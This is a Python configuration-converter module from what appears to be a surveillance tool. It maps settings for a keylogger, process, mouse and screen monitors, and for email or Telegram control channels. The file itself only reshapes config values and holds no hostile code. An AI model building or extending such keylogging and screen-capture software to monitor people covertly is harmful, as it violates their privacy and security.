from ._config import CtrlMode


def converter(raw: dict) -> dict:
    result = {
        "general": {},
        "email": {},
        "telegram": {},
        "keylogger": {},
        "processMntr": {},
        "mouseMntr": {},
        "screenMntr": {}
    }

    ctrl = raw["General"]["control-mode"]
    val: int = 0

    if ctrl == "telegram":
        val = 1

    result["general"] = {
        "controlMode": CtrlMode(val),
        "monitorEvery": raw["General"]["monitor-every"],
        "saveDataTo": raw["General"]["save-data-to"]
    }

    result["email"] = {
        "programEmail": raw["Email"]["program-email"],
        "adminEmail": raw["Email"]["admin-email"]
    }

    result["telegram"] = {

    }

    result["keylogger"] = {
        "enable": raw["Components"]["KeyLogger"]["enable"]
    }

    result["processMntr"] = {
        "enable": raw["Components"]["Process-Monitor"]["enable"],
        "logEvery": raw["Components"]["Process-Monitor"]["log-every"]
    }

    result["mouseMntr"] = {
        "enable": raw["Components"]["Mouse-Monitor"]["enable"],
        "captureOnActivity": raw["Components"]["Mouse-Monitor"]["capture-on-activity"]
    }

    result["screenMntr"] = {
        "enable": raw["Components"]["Screen-Monitor"]["enable"],
        "logEvery": raw["Components"]["Screen-Monitor"]["log-every"]
    }

    return result
